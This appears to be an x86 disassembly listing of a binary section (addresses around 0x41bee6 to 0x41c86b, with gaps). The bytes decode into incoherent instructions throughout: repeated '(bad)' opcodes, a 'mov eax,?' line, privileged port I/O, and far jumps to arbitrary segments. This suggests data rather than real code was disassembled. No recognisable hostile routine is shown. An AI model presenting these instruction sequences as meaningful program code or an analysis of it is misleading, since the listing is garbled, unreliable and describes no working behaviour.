  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR [esi],bl
  41beef:	data16 jg 0x41bf53
  41bef2:	jno    0x41becc
  41bef4:	or     edi,DWORD PTR [ebx]
  41bef6:	popf   
  41bef7:	scas   al,BYTE PTR es:[edi]
  41bef8:	push   esi
  41bef9:	bound  esi,QWORD PTR [ebx+0x21]
  41befc:	out    0x2a,al
  41befe:	adc    al,BYTE PTR [eax-0x2f]
  41bf01:	pop    ecx
  41bf02:	jmp    0x838fc297
  41bf07:	add    al,0x3e
  41bf09:	cmc    
  41bf0a:	or     ebx,DWORD PTR [edi+0x43]
  41bf0d:	out    0x0,al
  41bf0f:	pop    es
  41bf10:	jmp    0x22d:0x72a1baa3
  41bf17:	adc    esp,DWORD PTR [eax-0x4c5bee87]
  41bf1d:	xchg   esp,eax
  41bf1e:	inc    ebp
  41bf1f:	call   0x65cf:0x702f6660
  41bf26:	ins    DWORD PTR es:[edi],dx
  41bf27:	aam    0xd
  41bf29:	push   ds
  41bf2a:	test   DWORD PTR [esi-0x6b],0xad8591a0
  41bf31:	jno    0x41bee0
  41bf33:	(bad)  
  41bf34:	fimul  DWORD PTR [edi]
  41bf36:	mov    ebp,DWORD PTR [ecx]
  41bf38:	cdq    
  41bf39:	pop    edx
  41bf3a:	stos   BYTE PTR es:[edi],al
  41bf3b:	inc    edx
  41bf3c:	pop    ebx
  41bf3d:	fild   DWORD PTR [esi+0x46c2dcaa]
  41bf43:	(bad)  
  41bf44:	fbstp  TBYTE PTR [ebx]
  41bf46:	dec    DWORD PTR [ecx]
  41bf48:	lea    edi,[edx]
  41bf4a:	lds    ebx,FWORD PTR [ebp+0x6755b737]
  41bf50:	call   0x7767:0x843627f8
  41bf57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf58:	mov    ebp,0x3df5fb49
  41bf5d:	in     al,dx
  41bf5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf5f:	test   ebp,esi
  41bf61:	add    bh,BYTE PTR [ebx-0x3]
  41bf64:	rcl    bl,cl
  41bf66:	pop    es
  41bf67:	push   edx
  41bf68:	mov    bl,0x46
  41bf6a:	push   0xfffffff8
  41bf6c:	stc    
  41bf6d:	in     al,dx
  41bf6e:	add    dl,BYTE PTR [eax]
  41bf70:	inc    eax
  41bf71:	mov    dh,0x97
  41bf73:	adc    ah,0x73
  41bf76:	add    esp,DWORD PTR [edx]
  41bf78:	fst    DWORD PTR [eax-0x7e]
  41bf7b:	xchg   ebx,eax
  41bf7c:	fs push ss
  41bf7e:	retf   
  41bf7f:	push   edx
  41bf80:	xchg   edi,eax
  41bf81:	adc    BYTE PTR [ebx],cl
  41bf83:	xor    al,0x61
  41bf85:	ror    DWORD PTR [eax-0x4514244b],1
  41bf8b:	out    0xbd,al
  41bf8d:	add    al,0xe2
  41bf8f:	sbb    al,0xe
  41bf91:	cmp    dh,BYTE PTR [ebx+0x5a]
  41bf94:	jae    0x41c00b
  41bf96:	xchg   ebp,eax
  41bf97:	ins    BYTE PTR es:[edi],dx
  41bf98:	xchg   DWORD PTR [ebx],edi
  41bf9a:	retf   0x670b
  41bf9d:	sub    esi,DWORD PTR [ebp+0x6b]
  41bfa0:	fs jo  0x41bf36
  41bfa3:	popf   
  41bfa4:	inc    eax
  41bfa5:	inc    ebx
  41bfa6:	lods   eax,DWORD PTR ds:[esi]
  41bfa7:	jmp    0x9bfc62db
  41bfac:	cmp    ecx,ebx
  41bfae:	pop    ds
  41bfaf:	sub    edi,esi
  41bfb1:	or     BYTE PTR [edx-0x33059905],dh
  41bfb7:	or     eax,0x60611042
  41bfbc:	(bad)  
  41bfbd:	cmp    bl,dh
  41bfbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfc0:	pop    ecx
  41bfc1:	int    0x8f
  41bfc3:	pop    ss
  41bfc4:	dec    ecx
  41bfc5:	mov    ds:0xe02961a1,al
  41bfca:	sub    eax,0x613c3bb5
  41bfcf:	xchg   DWORD PTR [ebp-0x25002064],ebx
  41bfd5:	int    0x9b
  41bfd7:	shl    BYTE PTR [edx-0x51e96a36],cl
  41bfdd:	sti    
  41bfde:	xchg   edi,eax
  41bfdf:	call   0x6578:0xa8aada9c
  41bfe6:	mov    fs:0xffb2d849,eax
  41bfec:	mov    dl,bl
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	mov    esp,edx
  41c064:	mov    gs,eax
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	loopne 0x41c0bf
  41c070:	int    0x6d
  41c072:	jae    0x41c060
  41c074:	mov    edi,0x8bcbb3d0
  41c079:	cmp    al,0xa4
  41c07b:	div    edi
  41c07d:	sbb    BYTE PTR [eax],ah
  41c07f:	dec    eax
  41c080:	push   0xfffffffc
  41c082:	mov    ah,0x57
  41c084:	icebp  
  41c085:	xchg   edi,eax
  41c086:	lods   eax,DWORD PTR ds:[esi]
  41c087:	ins    DWORD PTR es:[edi],dx
  41c088:	loopne 0x41c055
  41c08a:	test   esp,eax
  41c08c:	dec    eax
  41c08d:	pop    eax
  41c08e:	retf   
  41c08f:	adc    ecx,esp
  41c091:	(bad)
  41c094:	sar    DWORD PTR [ebx],0x79
  41c097:	mov    ah,BYTE PTR ds:0x10615ca9
  41c09d:	call   0xccbbfa3d
  41c0a2:	mov    al,ds:0x2bbd2f0
  41c0a7:	pop    ds
  41c0a8:	aas    
  41c0a9:	pop    ss
  41c0aa:	sti    
  41c0ab:	ss xor eax,0xe9c29034
  41c0b1:	arpl   cx,sp
  41c0b3:	mov    bh,0xe6
  41c0b5:	fcmovbe st,st(5)
  41c0b7:	cli    
  41c0b8:	xchg   dh,ch
  41c0ba:	out    0x30,al
  41c0bc:	push   ecx
  41c0bd:	test   al,0xe9
  41c0bf:	pop    esi
  41c0c0:	pop    ss
  41c0c1:	test   al,0x4a
  41c0c3:	out    dx,eax
  41c0c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c5:	scas   eax,DWORD PTR es:[edi]
  41c0c6:	jge    0x41c0ed
  41c0c8:	pushf  
  41c0c9:	sub    DWORD PTR [ecx-0x6fe26447],ebp
  41c0cf:	repnz push edi
  41c0d1:	or     ecx,edi
  41c0d3:	sar    BYTE PTR [edx-0x40],1
  41c0d6:	sbb    dl,0x39
  41c0d9:	mov    ds:0x4dcc6516,al
  41c0de:	mov    eax,0xc35febec
  41c0e3:	ret    0x2abd
  41c0e6:	ror    edi,cl
  41c0e8:	xchg   ecx,eax
  41c0e9:	pop    edi
  41c0ea:	dec    esp
  41c0eb:	out    0x1b,al
  41c0ed:	xor    edx,DWORD PTR [edx+0x6d2e3041]
  41c0f3:	dec    ebx
  41c0f4:	ficom  DWORD PTR [ecx]
  41c0f6:	push   cs
  41c0f7:	mov    eax,ds:0xee748744
  41c0fc:	push   es
  41c0fd:	or     al,0xdf
  41c0ff:	enter  0x7f2c,0xc7
  41c103:	mov    ds:0x77ee3eb1,eax
  41c108:	icebp  
  41c109:	mov    ds,WORD PTR [ecx+0x318f5024]
  41c10f:	outs   dx,DWORD PTR ds:[esi]
  41c110:	pop    ss
  41c111:	test   al,0xed
  41c113:	inc    eax
  41c114:	pop    ebp
  41c115:	test   ebp,eax
  41c117:	shl    BYTE PTR [ebx],0x23
  41c11a:	xor    al,BYTE PTR [eax-0x76c3c050]
  41c120:	popfw  
  41c122:	jns    0x41c0d4
  41c124:	mov    ebp,DWORD PTR [ecx+0x2a39cc65]
  41c12a:	es in  al,dx
  41c12c:	xchg   ebp,eax
  41c12d:	daa    
  41c12e:	outs   dx,BYTE PTR ds:[esi]
  41c12f:	mov    dl,0x8f
  41c131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c132:	in     al,dx
  41c133:	scas   eax,DWORD PTR es:[edi]
  41c134:	dec    esp
  41c135:	ja     0x41c104
  41c137:	cmp    dl,BYTE PTR [edx+0x9]
  41c13a:	mov    dl,0xdf
  41c13c:	sub    eax,0xc368fbf7
  41c141:	ret    
  41c142:	test   al,0xea
  41c144:	mov    edi,0x391c1496
  41c149:	jbe    0x41c11b
  41c14b:	imul   ebx,ebp,0x31
  41c14e:	inc    ebx
  41c14f:	mov    ds:0x15f4433c,al
  41c154:	mov    ah,BYTE PTR [ecx+0x75aca270]
  41c15a:	das    
  41c15b:	idiv   DWORD PTR [esi+0x59]
  41c15e:	jne    0x41c1ad
  41c160:	push   si
  41c162:	out    0x1c,al
  41c164:	scas   eax,DWORD PTR es:[edi]
  41c165:	pusha  
  41c166:	cdq    
  41c167:	mov    dh,BYTE PTR [eax+0x7587544b]
  41c16d:	xchg   esi,eax
	...
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0xa206eae9,eax
  41c1e5:	pushf  
  41c1e6:	add    DWORD PTR cs:[bx+si],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	lock mov esp,0xd83d3a73
  41c1f4:	mov    ebp,0xa2b73483
  41c1f9:	push   ss
  41c1fa:	pop    es
  41c1fb:	das    
  41c1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1fd:	xor    al,ch
  41c1ff:	fsub   QWORD PTR [ebx+0x3f22648a]
  41c205:	adc    al,0x8d
  41c207:	cmp    eax,0x58b2326b
  41c20c:	xchg   BYTE PTR [eax],dh
  41c20e:	cmp    bl,BYTE PTR [edi+ecx*1+0x4d]
  41c212:	leave  
  41c213:	adc    eax,0x7f98b25f
  41c218:	imul   ecx,ebp,0x4a
  41c21b:	add    ebp,esi
  41c21d:	jo     0x41c1b1
  41c21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c220:	mov    ch,0xbd
  41c222:	sub    DWORD PTR [esi-0x61],edx
  41c225:	aaa    
  41c226:	adc    DWORD PTR [ebx],edx
  41c228:	jmp    0xfd57:0xbf7ef470
  41c22f:	shr    DWORD PTR [eax-0x7b],cl
  41c232:	aam    0xdc
  41c234:	add    bh,BYTE PTR [edx]
  41c236:	les    ebp,FWORD PTR [edx]
  41c238:	dec    edi
  41c239:	dec    ebx
  41c23a:	mov    ch,0x2c
  41c23c:	xlat   BYTE PTR ds:[ebx]
  41c23d:	retf   0xb37c
  41c240:	loop   0x41c291
  41c242:	cmp    al,BYTE PTR [ebp+0x676b39a9]
  41c248:	je     0x41c2ae
  41c24a:	and    BYTE PTR [esi-0x65],cl
  41c24d:	aam    0x94
  41c24f:	xchg   edx,eax
  41c250:	ins    BYTE PTR es:[edi],dx
  41c251:	lahf   
  41c252:	inc    edi
  41c253:	push   0xffffffb0
  41c255:	popf   
  41c256:	inc    edi
  41c257:	scas   al,BYTE PTR es:[edi]
  41c258:	enter  0xd6bb,0x70
  41c25c:	and    ebp,DWORD PTR [edi]
  41c25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c25f:	sbb    al,0xff
  41c261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c262:	data16 lahf 
  41c264:	fild   DWORD PTR [esi-0x3e1303ff]
  41c26a:	pop    esp
  41c26b:	(bad)  
  41c26c:	pop    ebp
  41c26d:	popa   
  41c26e:	nop
  41c26f:	xor    DWORD PTR [esi],0xff7f7f69
  41c275:	jo     0x41c275
  41c277:	adc    bl,cl
  41c279:	adc    eax,0x90af98ff
  41c27e:	stc    
  41c27f:	pop    ecx
  41c280:	mov    edx,0xaee0c514
  41c285:	repz imul bl
  41c288:	jne    0x41c2bc
  41c28a:	adc    DWORD PTR [esp+edi*8],esp
  41c28d:	push   0x2a006347
  41c292:	(bad)  
  41c293:	scas   eax,DWORD PTR es:[edi]
  41c294:	leave  
  41c295:	xchg   DWORD PTR [edi],edi
  41c297:	jmp    0x41c269
  41c299:	inc    edi
  41c29a:	add    eax,DWORD PTR [eax]
  41c29c:	adc    eax,0x81c6ef3f
  41c2a1:	or     ah,al
  41c2a3:	dec    ecx
  41c2a4:	dec    ebp
  41c2a5:	add    dl,ch
  41c2a7:	repz mov cl,0xcb
  41c2aa:	pusha  
  41c2ab:	ins    BYTE PTR es:[edi],dx
  41c2ac:	(bad)  [ecx]
  41c2ae:	ins    DWORD PTR es:[edi],dx
  41c2af:	scas   eax,DWORD PTR es:[edi]
  41c2b0:	inc    edx
  41c2b1:	(bad)  [esp+eiz*2-0x7a]
  41c2b5:	push   ebp
  41c2b6:	sub    al,0x5
  41c2b8:	fnstcw WORD PTR [ecx+0x39]
  41c2bb:	jl     0x41c2e8
  41c2bd:	sub    DWORD PTR [edx-0x135c495f],ecx
  41c2c3:	leave  
  41c2c4:	ss enter 0x83e,0xb
  41c2c9:	ret    
  41c2ca:	jnp    0x41c24c
  41c2cc:	or     DWORD PTR [edi+0x3fd91c3e],edi
  41c2d2:	sub    esp,esi
  41c2d4:	js     0x41c2cf
  41c2d6:	js     0x41c2ac
  41c2d8:	pop    edx
  41c2d9:	mov    BYTE PTR [eax+eax*1-0x20],dh
  41c2dd:	or     al,0x1a
  41c2df:	lahf   
  41c2e0:	aam    0x4
  41c2e2:	mov    WORD PTR [ecx+0x73],ds
  41c2e5:	mov    edi,0x4581c8ed
  41c2ea:	fcomp  DWORD PTR [ebp+eiz*1+0xce]
	...
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	cmp    eax,0x673a1f6b
  41c367:	das    
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	cmc    
  41c36f:	jne    0x41c308
  41c371:	cmp    dh,BYTE PTR [ebp+0x65971322]
  41c377:	ja     0x41c395
  41c379:	test   eax,0x83729a97
  41c37e:	mov    eax,ds:0x2af18127
  41c383:	and    ebx,DWORD PTR [ebp-0x437b5f94]
  41c389:	xchg   edi,eax
  41c38a:	adc    ah,BYTE PTR [edx-0x3341770b]
  41c390:	scas   eax,DWORD PTR es:[edi]
  41c391:	jbe    0x41c3f5
  41c393:	ror    BYTE PTR [ecx+0x63],1
  41c396:	xchg   esi,eax
  41c397:	jno    0x41c349
  41c399:	and    bl,bl
  41c39b:	inc    ecx
  41c39c:	and    al,0x2
  41c39e:	ds es push ss
  41c3a1:	sbb    BYTE PTR [edi+0x63f1ffe0],cl
  41c3a7:	mov    ds:0xdf0b876f,al
  41c3ac:	dec    ecx
  41c3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ae:	cmp    al,0xac
  41c3b0:	mov    eax,?
  41c3b2:	bound  eax,QWORD PTR [edi-0x36]
  41c3b5:	pop    ebp
  41c3b6:	mov    edi,0x987926bd
  41c3bb:	mov    esp,0xb81f0fc7
  41c3c0:	scas   al,BYTE PTR es:[edi]
  41c3c1:	xor    eax,0xc263796d
  41c3c6:	stos   BYTE PTR es:[edi],al
  41c3c7:	(bad)  
  41c3c8:	int3   
  41c3c9:	into   
  41c3ca:	add    edi,DWORD PTR [edx+0x35d4fe61]
  41c3d0:	dec    esi
  41c3d1:	push   0x10188bae
  41c3d6:	jae    0x41c367
  41c3d8:	push   edx
  41c3d9:	inc    esi
  41c3da:	add    BYTE PTR [edi+esi*4],0x85
  41c3de:	(bad)  
  41c3df:	jmp    0xc53bd189
  41c3e4:	pusha  
  41c3e5:	sub    ebp,0x63b628a
  41c3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ec:	mov    ebx,0x362e25e4
  41c3f1:	sub    BYTE PTR [edx],ch
  41c3f3:	or     DWORD PTR [eax+ecx*2+0x75],edx
  41c3f7:	mov    BYTE PTR [edx],dl
  41c3f9:	jb     0x41c3d8
  41c3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3fc:	int    0xaa
  41c3fe:	xchg   DWORD PTR [ebp-0x76],esp
  41c401:	rcl    BYTE PTR [ecx-0x44],1
  41c404:	int    0x40
  41c406:	pop    edx
  41c407:	leave  
  41c408:	mov    al,0x8d
  41c40a:	dec    ebp
  41c40b:	ret    0xdf28
  41c40e:	dec    eax
  41c40f:	push   ebx
  41c410:	and    edx,DWORD PTR [esi+0x72]
  41c413:	dec    ecx
  41c414:	imul   esp,DWORD PTR [ebx+esi*4+0x4c628c2b],0xffffff82
  41c41c:	fsubr  QWORD PTR [esi+0x1bcbbe86]
  41c422:	push   cs
  41c423:	test   eax,0xcc8910f6
  41c428:	or     edi,DWORD PTR [esi+0x32]
  41c42b:	clc    
  41c42c:	xchg   cl,bh
  41c42e:	ins    BYTE PTR es:[edi],dx
  41c42f:	pop    ebp
  41c430:	sub    ebp,0xed9eab05
  41c436:	aad    0x24
  41c438:	in     eax,dx
  41c439:	push   ds
  41c43a:	pop    cx
  41c43c:	inc    edx
  41c43d:	push   esp
  41c43e:	sbb    BYTE PTR [ebx],bl
  41c440:	mov    eax,0xf3646d25
  41c445:	aas    
  41c446:	int    0xc0
  41c448:	sub    eax,0x751a82d3
  41c44d:	jno    0x41c40e
  41c44f:	int3   
  41c450:	jecxz  0x41c48b
  41c452:	(bad)  
  41c453:	mov    ecx,0xddaa5953
  41c458:	ror    DWORD PTR [ecx-0x46],0x74
  41c45c:	div    DWORD PTR [ecx-0x3b]
  41c45f:	xchg   ebx,eax
  41c460:	sbb    al,0x2c
  41c462:	mov    ebp,0xede5c749
  41c467:	(bad)  
  41c468:	loope  0x41c409
  41c46a:	mov    ch,0x96
  41c46c:	push   ecx
  41c46d:	cmp    al,BYTE PTR [eax]
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	jb     0x41c4ca
  41c4e4:	pop    esi
  41c4e5:	jmp    0x42f551
  41c4ea:	add    BYTE PTR [ecx],al
  41c4ec:	add    BYTE PTR [eax],al
  41c4ee:	pusha  
  41c4ef:	or     BYTE PTR [eax+0x57],dl
  41c4f2:	retf   
  41c4f3:	jns    0x41c47d
  41c4f5:	jno    0x41c4f6
  41c4f7:	cmp    bh,dl
  41c4f9:	fsubr  QWORD PTR [esi-0x28]
  41c4fc:	xor    BYTE PTR [edi-0x68b93de7],ch
  41c502:	xor    DWORD PTR [ecx],eax
  41c504:	test   BYTE PTR [esi],0x79
  41c507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c508:	test   DWORD PTR [ecx-0x2e],0xa590d6a6
  41c50f:	and    esp,DWORD PTR [edx]
  41c511:	jo     0x41c55c
  41c513:	jne    0x41c4a9
  41c515:	ja     0x41c512
  41c517:	inc    ebx
  41c518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c519:	dec    esp
  41c51a:	out    dx,al
  41c51b:	jnp    0x41c577
  41c51d:	sub    edx,DWORD PTR [edi]
  41c51f:	cli    
  41c520:	test   bh,0x17
  41c523:	ret    
  41c524:	lods   al,BYTE PTR ds:[si]
  41c526:	mov    dh,BYTE PTR [ebx-0xc0124be]
  41c52c:	mov    ebp,0x3597c83f
  41c531:	add    DWORD PTR [edx+ebx*2],ebp
  41c534:	imul   eax,ebx,0xcc1365e0
  41c53a:	pop    ebx
  41c53b:	and    ebp,DWORD PTR [esp+ebp*1-0x52]
  41c53f:	imul   ecx,DWORD PTR [eax],0xb914b5f8
  41c545:	aam    0xca
  41c547:	pop    ebx
  41c548:	inc    ebx
  41c549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c54a:	(bad)  
  41c54b:	push   edx
  41c54c:	jle    0x41c4e1
  41c54e:	pusha  
  41c54f:	bound  ebx,QWORD PTR [ecx]
  41c551:	bound  eax,QWORD PTR [ecx+0x6581c140]
  41c557:	or     eax,0xdfc0ec03
  41c55c:	fidivr WORD PTR [edi-0x5d06fd34]
  41c562:	out    0x54,eax
  41c564:	mov    esi,0xecdf2017
  41c569:	test   BYTE PTR fs:[ebp-0x22],dh
  41c56d:	call   FWORD PTR ds:0x60bef6d2
  41c573:	out    0x94,eax
  41c575:	sbb    ebx,DWORD PTR ds:0xc634b91
  41c57b:	push   ebx
  41c57c:	out    0x37,eax
  41c57e:	push   eax
  41c57f:	mov    cl,0x8a
  41c581:	xor    BYTE PTR [edi-0x617fbf65],bl
  41c587:	int3   
  41c588:	push   ecx
  41c589:	daa    
  41c58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c58b:	cdq    
  41c58c:	inc    eax
  41c58d:	out    dx,al
  41c58e:	leave  
  41c58f:	push   esp
  41c590:	imul   esp,DWORD PTR [edi-0x3fe037e2],0xfffffff4
  41c597:	int3   
  41c598:	imul   esp,DWORD PTR [ecx],0xcf82ddb0
  41c59e:	add    al,al
  41c5a0:	mov    esp,DWORD PTR [ecx]
  41c5a2:	jl     0x41c55b
  41c5a4:	inc    eax
  41c5a5:	repz fs mov di,0x19aa
  41c5ab:	mov    dh,0xd5
  41c5ad:	into   
  41c5ae:	push   ds
  41c5af:	sbb    bl,BYTE PTR [esi+0x7a022d87]
  41c5b5:	xchg   esp,eax
  41c5b6:	dec    eax
  41c5b7:	jb     0x41c599
  41c5b9:	mov    ebx,0xba22edfb
  41c5be:	sahf   
  41c5bf:	mov    dl,0x3e
  41c5c1:	mov    cl,0x9f
  41c5c3:	adc    bl,BYTE PTR [ecx+0x75]
  41c5c6:	jp     0x41c5ff
  41c5c8:	icebp  
  41c5c9:	push   esi
  41c5ca:	push   edi
  41c5cb:	mov    edx,0xe88ceb01
  41c5d0:	retf   
  41c5d1:	cmp    ecx,DWORD PTR [ebx+0x7d]
  41c5d4:	push   cs
  41c5d5:	(bad)  
  41c5d6:	in     al,dx
  41c5d7:	inc    edx
  41c5d8:	test   al,0x53
  41c5da:	add    eax,0xca26c8df
  41c5df:	test   DWORD PTR ds:0xcd32aed9,edx
  41c5e5:	pusha  
  41c5e6:	jecxz  0x41c620
  41c5e8:	xlat   BYTE PTR ds:[ebx]
  41c5e9:	sub    al,0xf9
  41c5eb:	fld    TBYTE PTR [esi+0x32]
	...
  41c656:	lds    esp,FWORD PTR [ebx]
  41c658:	xchg   ecx,eax
  41c659:	and    eax,0xe3f5b7f7
  41c65e:	inc    ebx
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xe8a95a19
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	repnz mov eax,0x34310ea6
  41c674:	fwait
  41c675:	add    ax,0x610c
  41c679:	jmp    0x1ad01951
  41c67e:	inc    eax
  41c67f:	lods   eax,DWORD PTR ds:[esi]
  41c680:	(bad)  
  41c681:	mov    eax,ds:0xbd173c9
  41c686:	test   eax,0xb966895e
  41c68b:	imul   ecx,edx,0x7
  41c68e:	stc    
  41c68f:	or     edx,DWORD PTR [edx-0x5d54baf]
  41c695:	aas    
  41c696:	xor    DWORD PTR [edx],edx
  41c698:	js     0x41c6ce
  41c69a:	in     eax,0x62
  41c69c:	and    al,0x7d
  41c69e:	aad    0x5e
  41c6a0:	mov    esp,0xe5bbfa29
  41c6a5:	imul   ebp,DWORD PTR [ebp+0x7e82deff],0x44
  41c6ac:	mov    gs:0x8f929309,al
  41c6b2:	popa   
  41c6b3:	add    esi,esi
  41c6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6b6:	or     BYTE PTR [esi+edx*8],0xfd
  41c6ba:	add    BYTE PTR [edi+0x72],cl
  41c6bd:	and    BYTE PTR [eax+0x1928b8b7],ah
  41c6c3:	jbe    0x41c660
  41c6c5:	lea    eax,[edx+ebx*2]
  41c6c8:	int    0x3e
  41c6ca:	xor    BYTE PTR [ecx-0x1a],ah
  41c6cd:	or     esi,ebp
  41c6cf:	imul   bx,WORD PTR [esi+edx*8],0x8581
  41c6d5:	loop   0x41c695
  41c6d7:	xor    BYTE PTR [ebp-0x39e25140],cl
  41c6dd:	lock sbb al,0xb8
  41c6e0:	pop    esp
  41c6e1:	push   edx
  41c6e2:	sub    eax,0xffb95c96
  41c6e7:	lea    edi,[edi+eax*8+0x315fb6f8]
  41c6ee:	lods   eax,DWORD PTR ds:[esi]
  41c6ef:	inc    edx
  41c6f0:	sar    dh,0x92
  41c6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f5:	aaa    
  41c6f6:	bound  edx,QWORD PTR [edx-0x7eaf61e1]
  41c6fc:	jge    0x41c728
  41c6fe:	in     eax,0xf0
  41c700:	xchg   ecx,eax
  41c701:	and    al,0xde
  41c703:	js     0x41c713
  41c705:	test   al,0xfc
  41c707:	jecxz  0x41c719
  41c709:	sub    eax,0xcf184c89
  41c70e:	(bad)  
  41c70f:	mov    cl,0x87
  41c711:	jno    0x41c69f
  41c713:	lar    edi,WORD PTR [ecx+ebp*2+0x45]
  41c718:	leave  
  41c719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c71a:	ret    
  41c71b:	jns    0x41c6ca
  41c71d:	jle    0x41c6b3
  41c71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c720:	call   0x72af1fc8
  41c725:	daa    
  41c726:	call   FWORD PTR [edx]
  41c728:	mov    ds:0xa97e0c99,eax
  41c72d:	jle    0x41c709
  41c72f:	clc    
  41c730:	das    
  41c731:	adc    BYTE PTR [eax+0xe],al
  41c734:	mov    edi,0x2f4d8ed5
  41c739:	mov    WORD PTR [ebp+0x2a5f0e0e],gs
  41c73f:	or     eax,0xe04606ae
  41c744:	(bad)  
  41c746:	loope  0x41c730
  41c748:	icebp  
  41c749:	jne    0x41c7c9
  41c74b:	cmp    al,0x1d
  41c74d:	adc    al,0xb2
  41c74f:	and    DWORD PTR [ebp+0x495d9cf7],edx
  41c755:	jns    0x41c6db
  41c757:	pop    esi
  41c758:	xor    DWORD PTR [esi+ebp*4-0x67],0xffffffde
  41c75d:	pop    edx
  41c75e:	add    edx,DWORD PTR [eax+ebp*4+0x4cdfa9f1]
  41c765:	fisttp DWORD PTR [eax+0x714bc79b]
  41c76b:	in     eax,0x59
  41c76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	retf   
  41c7e3:	push   ecx
  41c7e4:	rcr    DWORD PTR [ecx],0x67
  41c7e7:	xor    al,BYTE PTR [ecx]
  41c7e9:	add    BYTE PTR [eax],al
  41c7eb:	add    DWORD PTR [eax],eax
  41c7ed:	add    bh,bl
  41c7ef:	pop    ss
  41c7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f1:	xlat   BYTE PTR ds:[ebx]
  41c7f2:	and    al,0xab
  41c7f4:	ret    
  41c7f5:	popa   
  41c7f6:	or     dh,BYTE PTR [edx-0x6b]
  41c7f9:	push   es
  41c7fa:	xchg   al,bl
  41c7fc:	outs   dx,BYTE PTR ds:[esi]
  41c7fd:	pusha  
  41c7fe:	pop    esp
  41c7ff:	add    dh,BYTE PTR [esi+0x49e7b7b1]
  41c805:	add    BYTE PTR [ecx+0x6e07e64d],cl
  41c80b:	aad    0x9b
  41c80d:	inc    BYTE PTR [eax]
  41c80f:	mov    ss,esi
  41c811:	adc    DWORD PTR [edi-0x7e],ebx
  41c814:	adc    al,0xa2
  41c816:	rcl    BYTE PTR [ebx+0x1899f143],cl
  41c81c:	push   esi
  41c81d:	mov    es,eax
  41c81f:	sbb    DWORD PTR [ecx-0x43],edx
  41c822:	or     ebx,DWORD PTR [edx-0x48]
  41c825:	clc    
  41c826:	aad    0xe0
  41c828:	xor    al,BYTE PTR [edi+esi*4-0x74e5ba]
  41c82f:	inc    edx
  41c830:	scas   eax,DWORD PTR es:[edi]
  41c831:	rcl    DWORD PTR [ebp-0xd],0x7a
  41c835:	mov    DWORD PTR [ebx+0x3a2d51b7],esi
  41c83b:	inc    ebp
  41c83c:	adc    esi,esp
  41c83e:	out    0x6b,al
  41c840:	outs   dx,DWORD PTR ds:[esi]
  41c841:	mov    ecx,edx
  41c843:	leave  
  41c844:	jecxz  0x41c844
  41c846:	daa    
  41c847:	retf   
  41c848:	pop    ds
  41c849:	ins    BYTE PTR es:[edi],dx
  41c84a:	jecxz  0x41c835
  41c84c:	push   esi
  41c84d:	popf   
  41c84e:	jle    0x41c83d
  41c850:	retf   
  41c851:	lods   al,BYTE PTR ds:[esi]
  41c852:	push   ds
  41c853:	test   al,cl
  41c855:	in     eax,dx
  41c856:	xor    BYTE PTR [edx],bl
  41c858:	pop    esi
  41c859:	(bad)  
  41c85a:	push   ds
  41c85b:	mov    esi,0x45a6af60
  41c860:	jno    0x41c8c2
  41c862:	into   
  41c863:	sar    BYTE PTR [eax+0x26],1
  41c866:	jl     0x41c806
  41c868:	lock nop
  41c86a:	leave  
  41c86b:	jecxz  0x41c866
